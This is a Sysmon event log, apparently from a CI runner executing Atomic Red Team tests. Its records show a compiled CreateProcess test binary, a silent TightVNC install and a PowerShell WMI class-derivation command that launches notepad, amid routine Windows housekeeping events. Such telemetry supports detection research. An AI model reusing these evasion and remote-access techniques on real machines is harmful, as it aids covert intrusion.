ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:27.692
ProcessGuid: {f995aebf-622b-6942-7403-000000000e00}
ProcessId: 2224
Image: C:\Users\RUNNER~1\AppData\Local\Temp\T1106.exe
FileVersion: 0.0.0.0
Description:  
Product: -
Company: -
OriginalFileName: T1106.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp/T1106.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=E58B337E27EF395443F42CA8CAD7E27A85F69B0EE484DF908F9E7C1B59858054
ParentProcessGuid: {f995aebf-6228-6942-7003-000000000e00}
ParentProcessId: 4164
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""%tmp%\T1106.exe"" /target:exe ""C:\AtomicRedTeam\atomics\T1106\src\CreateProcess.cs"" & %tmp%/T1106.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:27 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:27.644
ProcessGuid: {f995aebf-6228-6942-7203-000000000e00}
ProcessId: 9536
Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\T1106.exe
CreationUtcTime: 2025-12-17 07:56:27.644
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:23.426
ProcessGuid: {f995aebf-6227-6942-6d03-000000000e00}
ProcessId: 6608
Image: C:\Windows\System32\msiexec.exe
FileVersion: 5.0.26100.5074 (WinBuild.160101.0800)
Description: Windows? installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: C:\Windows\system32\msiexec.exe /V
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f995aebf-5f5c-6942-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=677417BA3AD87F73CD95AD30423998C6089E7EEF381B309A562CDA1EB6FE178E
ParentProcessGuid: {f995aebf-5f5c-6942-0c00-000000000e00}
ParentProcessId: 972
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:56:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:23.066
ProcessGuid: {f995aebf-6227-6942-6c03-000000000e00}
ProcessId: 4352
Image: C:\Windows\System32\msiexec.exe
FileVersion: 5.0.26100.5074 (WinBuild.160101.0800)
Description: Windows? installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: msiexec  /i ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\tightvncinstaller.msi"" /qn /norestart
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=677417BA3AD87F73CD95AD30423998C6089E7EEF381B309A562CDA1EB6FE178E
ParentProcessGuid: {f995aebf-6227-6942-6a03-000000000e00}
ParentProcessId: 3776
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c msiexec /i ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\tightvncinstaller.msi"" /qn /norestart
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:23.004
ProcessGuid: {f995aebf-6227-6942-6a03-000000000e00}
ProcessId: 3776
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c msiexec /i ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\tightvncinstaller.msi"" /qn /norestart
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:22.290
ProcessGuid: {f995aebf-6226-6942-6503-000000000e00}
ProcessId: 6280
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lnzzkryp.ago.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:22.271
ProcessGuid: {f995aebf-6226-6942-6503-000000000e00}
ProcessId: 6280
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lnzzkryp.ago.ps1
CreationUtcTime: 2025-12-17 07:56:22.269
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:17 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:17.283
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Program Files\WindowsApps\Deleted\Microsoft.SecHealthUI_1000.26100.7171.0_x64__8wekyb3d8bbwedd4fb2be-5949-4754-91b7-55d1b28d0483\SecHealthUIViewModels.dll
Hashes: SHA256=6539324C5BF300D30991A1C9E4EB1BA5341F27480DFB58EDD50938BAAD498834
IsExecutable: true
Archived: true"
"12/17/2025 7:56:17 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:17.081
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Program Files\WindowsApps\Deleted\Microsoft.SecHealthUI_1000.26100.7171.0_x64__8wekyb3d8bbwedd4fb2be-5949-4754-91b7-55d1b28d0483\SecHealthUITelemetry.dll
Hashes: SHA256=514EFAA2A0B770DD6C1B38D71B147CDE8F8D7EC5930B6D6C4912C1C89B89ED7D
IsExecutable: true
Archived: true"
"12/17/2025 7:56:17 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:17.075
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Program Files\WindowsApps\Deleted\Microsoft.SecHealthUI_1000.26100.7171.0_x64__8wekyb3d8bbwedd4fb2be-5949-4754-91b7-55d1b28d0483\SecHealthUIDataModel.dll
Hashes: SHA256=3113ED12A1EE96D0D6627AE6720287A40049936AB00E665F7B2F121D1BC7A291
IsExecutable: true
Archived: true"
"12/17/2025 7:56:16 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:16.893
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Program Files\WindowsApps\Deleted\Microsoft.SecHealthUI_1000.26100.7171.0_x64__8wekyb3d8bbwedd4fb2be-5949-4754-91b7-55d1b28d0483\SecHealthUI.exe
Hashes: SHA256=32C4FA967131A52D69C60DC8A61C1A6E06C92C9AF3FBB4AB1F1DB0188D1330D8
IsExecutable: true
Archived: true"
"12/17/2025 7:56:16 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:16.439
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.eb0_4ee1_69odvzpgthx49jef.tmp
Hashes: SHA256=F10ADF47BA4B9B1F6C685721751FE7498C5D0C6B3B85737491FE72CE59EF9703
IsExecutable: false
Archived: true"
"12/17/2025 7:56:16 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:16.271
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.kogyqkxhrujowug5eincc_07b.tmp
Hashes: SHA256=BB5CCE0DD506EF736A023289DF08E3CBF89EE4962FB589E4C361EBBD203FFF81
IsExecutable: false
Archived: true"
"12/17/2025 7:56:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:15.474
ProcessGuid: {f995aebf-621f-6942-4c03-000000000e00}
ProcessId: 5756
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4cjbgfym.q3j.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:15.452
ProcessGuid: {f995aebf-621f-6942-4c03-000000000e00}
ProcessId: 5756
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4cjbgfym.q3j.ps1
CreationUtcTime: 2025-12-17 07:56:15.452
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:15.355
ProcessGuid: {f995aebf-621f-6942-4c03-000000000e00}
ProcessId: 5756
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\""""Win32_Process\""""))
$NewClass = $Class.Derive(\""""Win32_Atomic\"""")
$NewClass.Put()
Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:15.248
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.c2gbfl2ow4ax0z0jrjfrtgxxb.tmp
Hashes: SHA256=DF6C0144CBB0BE49C6EC99FC63BBEEF6E569DEDBFE84FD903E875719343AFCEC
IsExecutable: false
Archived: true"
"12/17/2025 7:56:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:15.248
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.isitpo4fwbpa8v9xhnjpwt5ib.tmp
Hashes: SHA256=F8764564DC1020F89489465E678EA797B35C8B9361D516467ED78F1DDDE45A1B
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.553
ProcessGuid: {f995aebf-621e-6942-4a03-000000000e00}
ProcessId: 3740
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4p5dkgxy.fw3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:14.531
ProcessGuid: {f995aebf-621e-6942-4a03-000000000e00}
ProcessId: 3740
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4p5dkgxy.fw3.ps1
CreationUtcTime: 2025-12-17 07:56:14.531
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.332
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.kqepo7va9pg0wjjjk9d74znpb.tmp
Hashes: SHA256=F4678E79C8737A3E07C6F43A26056ABDEF9FB0C0B4987D27A69CAC892A3DB5F4
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.310
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.qbyez_7o5h6ec3lfjbpaou15g.tmp
Hashes: SHA256=B718B1E4EA0EA7BDF98C0378B9CCA1CF1C20801587BB9DA94F9DEE75AD6C0928
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.306
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.jmens5l98h5lgv4ytnyol_5wd.tmp
Hashes: SHA256=B7BC3E83E97D2481A37B3D40D01777A0401EEF34F1BE57F35F2A77ABE86DBD1D
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.306
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.86ki71cttihx98ftwnfhcwqyd.tmp
Hashes: SHA256=C33BA489FD914F1137BD2DA29DF5BA1E1D13F8CF23016A9DBDF9F54F379FE2B6
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.049
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.mqev426p2t9lpqw7ljrhbxlf.tmp
Hashes: SHA256=674DDBA3016F02ABFBDFD563271D372D59C23AD36CAAB0887083A6507A468DD2
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.012
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX._ir9rr63o5uefp8jzclm5a1mh.tmp
Hashes: SHA256=261B88EECF384D4FD30DD4867A87A32FAF677FC6347E0F33A541C98CFF792ACD
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.012
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.lacq1m__hk3sj85a6psau3c1g.tmp
Hashes: SHA256=71A38AE34FB7DB717AE62F2859062AFF3DF65E27DDC784E84E011068F668C637
IsExecutable: false
Archived: true"
"12/17/2025 7:56:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:14.010
ProcessGuid: {f995aebf-5f61-6942-6600-000000000e00}
ProcessId: 3844
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\Temp\APPX.c0jqbimxxbh5_vlc6nlubnvzd.tmp
Hashes: SHA256=CE9384C3BBA7EEE53F50CB51C3A0129A9774C783993619329626FE5D0301EE42
IsExecutable: false
Archived: true"
"12/17/2025 7:56:13 AM","25","Process Tampering:
RuleName: ProcessTampering
UtcTime: 2025-12-17 07:56:13.562
ProcessGuid: {f995aebf-621d-6942-4203-000000000e00}
ProcessId: 8020
Image: C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthHost.exe
Type: Image is locked for access
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:13 AM","25","Process Tampering:
RuleName: ProcessTampering
UtcTime: 2025-12-17 07:56:13.523
ProcessGuid: {f995aebf-621d-6942-4103-000000000e00}
ProcessId: 6084
Image: C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthHost.exe
Type: Image is locked for access
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:13.515
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\SecurityHealthService.exe
TargetFilename: C:\Windows\Temp\APPX.fx0w6sbzyt24of95_31dvt29b.tmp
Hashes: SHA256=BB5CCE0DD506EF736A023289DF08E3CBF89EE4962FB589E4C361EBBD203FFF81
IsExecutable: false
Archived: true"
"12/17/2025 7:56:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:13.514
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\SecurityHealthService.exe
TargetFilename: C:\Windows\Temp\APPX.0ylkvxnyfif5naw4938e5821d.tmp
Hashes: SHA256=F10ADF47BA4B9B1F6C685721751FE7498C5D0C6B3B85737491FE72CE59EF9703
IsExecutable: false
Archived: true"
"12/17/2025 7:56:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:13.503
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\SecurityHealthService.exe
TargetFilename: C:\Windows\Temp\APPX.f_o1pox3os5w8ge3wc7n_ieof.tmp
Hashes: SHA256=DF6C0144CBB0BE49C6EC99FC63BBEEF6E569DEDBFE84FD903E875719343AFCEC
IsExecutable: false
Archived: true"
"12/17/2025 7:56:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:13.502
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\SecurityHealthService.exe
TargetFilename: C:\Windows\Temp\APPX.gxa2dptgb43f4sn_kp63w1evh.tmp
Hashes: SHA256=F8764564DC1020F89489465E678EA797B35C8B9361D516467ED78F1DDDE45A1B
IsExecutable: false
Archived: true"
"12/17/2025 7:56:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:11.070
ProcessGuid: {f995aebf-621a-6942-2f03-000000000e00}
ProcessId: 3104
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dijwgp44.pv4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:11.048
ProcessGuid: {f995aebf-621a-6942-2f03-000000000e00}
ProcessId: 3104
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dijwgp44.pv4.ps1
CreationUtcTime: 2025-12-17 07:56:11.048
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:10.150
ProcessGuid: {f995aebf-621a-6942-2903-000000000e00}
ProcessId: 2776
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ceh4wie2.no4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:10.126
ProcessGuid: {f995aebf-621a-6942-2903-000000000e00}
ProcessId: 2776
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ceh4wie2.no4.ps1
CreationUtcTime: 2025-12-17 07:56:10.126
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:04 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:56:04.550
ProcessGuid: {f995aebf-61f2-6942-1203-000000000e00}
ProcessId: 7848
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 7:55:57 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:55:57.652
ProcessGuid: {f995aebf-5f77-6942-cc00-000000000e00}
ProcessId: 5888
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:57 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:55:57.647
ProcessGuid: {f995aebf-5f77-6942-cc00-000000000e00}
ProcessId: 5888
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.285
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{82345212-6ACA-4B38-8CD7-BF9DE8ED07BD}\InProcServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.285
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{82345212-6ACA-4B38-8CD7-BF9DE8ED07BD}\InProcServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:55:43.285
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{82345212-6ACA-4B38-8CD7-BF9DE8ED07BD}\InProcServer32
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.282
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{10964DDD-6A53-4C60-917F-7B5723014344}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.281
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{10964DDD-6A53-4C60-917F-7B5723014344}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.279
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{849F5497-5C61-4023-8E10-A28F1A8C6A70}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.277
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{849F5497-5C61-4023-8E10-A28F1A8C6A70}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.277
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{DBF393FC-230C-46CC-8A85-E9C599A81EFB}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.277
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{DBF393FC-230C-46CC-8A85-E9C599A81EFB}\InprocServer32\(Default)
Details: \\?\C:\Windows\System32\SecurityHealth\10.0.29429.1000-0\SecurityHealthAgent.dll
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.275
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
TargetObject: HKCR\CLSID\{C8DFF91D-B243-4797-BAE6-C461B65EDED3}\InprocServer32\ThreadingModel
Details: Both
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:55:43 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:55:43.275
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\system32\SecurityHealthService.exe
